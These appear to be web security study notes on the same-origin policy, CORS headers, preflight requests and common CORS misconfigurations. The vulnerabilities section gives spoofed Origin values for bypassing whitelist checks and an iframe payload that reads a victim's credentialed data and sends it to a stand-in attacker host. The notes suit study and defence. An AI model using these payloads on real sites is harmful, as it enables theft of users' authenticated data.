# Content 
- [SOP](#sop)
- [CORS](#cors)
  - [CORS Headers](#cors-headers)
  - [Pre-flight checks](#pre-flight-checks)
- [Vulnerabilities](#vulnerabilities)

## SOP 
Generally, embedding a cross-origin resource is permitted, while reading a cross-origin resource is blocked. [source](https://web.dev/same-origin-policy/)
| Element     | Cross-Origin Permissions                                        |
|-------------|----------------------------------------------------------------|
| iframes     | Cross-origin embedding is usually permitted (depending on the X-Frame-Options directive), but cross-origin reading (such as using JavaScript to access a document in an iframe) isn't. |
| CSS         | Cross-origin CSS can be embedded using a <link> element or an @import in a CSS file. The correct Content-Type header may be required. |
| forms       | Cross-origin URLs can be used as the action attribute value of form elements. A web application can write form data to a cross-origin destination. |
| images      | Embedding cross-origin images is permitted. However, reading cross-origin image data (such as retrieving binary data from a cross-origin image using JavaScript) is blocked. |
| multimedia  | Cross-origin video and audio can be embedded using <video> and <audio> elements. |
| script      | Cross-origin scripts can be embedded; however, access to certain APIs (such as cross-origin fetch requests) might be blocked. |

There are various exceptions to the same-origin policy:
- Some objects are writable but not readable cross-domain, such as the location object or the location.href property from iframes or new windows.
- Some objects are readable but not writable cross-domain, such as the length property of the window object (which stores the number of frames being used on the page) and the closed property.
- The replace function can generally be called cross-domain on the location object.
- You can call certain functions cross-domain. For example, you can call the functions close, blur and focus on a new window. The postMessage function can also be called on iframes and new windows in order to send messages from one domain to another.


## CORS 
Cross-origin resource sharing (CORS) is a browser mechanism which enables controlled access to resources located outside of a given domain. It extends and adds flexibility to the same-origin policy (SOP). 


### CORS Headers
- request
```http
Origin : domain
```
- response
```http
Access-Control-Allow-Origin: * | null | domain 
Access-Control-Allow-Credentials: true | false
```
### Pre-flight checks
when a cross-domain request includes a non-standard HTTP method or headers, the cross-origin request is preceded by a request using the OPTIONS method
- response
```http
Access-Control-Allow-Origin: https://normal-website.com
Access-Control-Allow-Methods: PUT, POST, OPTIONS
Access-Control-Allow-Headers: Special-Request-Header
Access-Control-Allow-Credentials: true
Access-Control-Max-Age: 240                                => defines a maximum timeframe for caching the pre-flight response for reuse
```


## Vulnerabilities
### Server-generated ACAO header from client-specified Origin header
- request
```http
GET /sensitive-victim-data HTTP/1.1
Host: vulnerable-website.com
Origin: https://malicious-website.com
Cookie: sessionid=...
```
- response
```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://malicious-website.com
Access-Control-Allow-Credentials: true
```

### Errors parsing Origin headers
- Mistakes often arise when implementing CORS origin whitelists. 
- These rules are often implemented by matching URL prefixes or suffixes, or using regular expressions. 
- Any mistakes in the implementation can lead to access being granted to unintended external domains.



For example, suppose an application grants access to all domains ending in: `normal-website.com`
```
Origin: https://hackersnormal-website.com
```
For example, suppose an application grants access to all domains beginning with `normal-website.com`
```
Origin: normal-website.com.evil-user.net
```

### Whitelisted null origin value
For example, this can be done using a sandboxed iframe cross-origin request of the form:
```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','vulnerable-website.com/sensitive-victim-data',true);
req.withCredentials = true;
req.send();

function reqListener() {
location='malicious-website.com/log?key='+this.responseText;
};
</script>"></iframe>
```
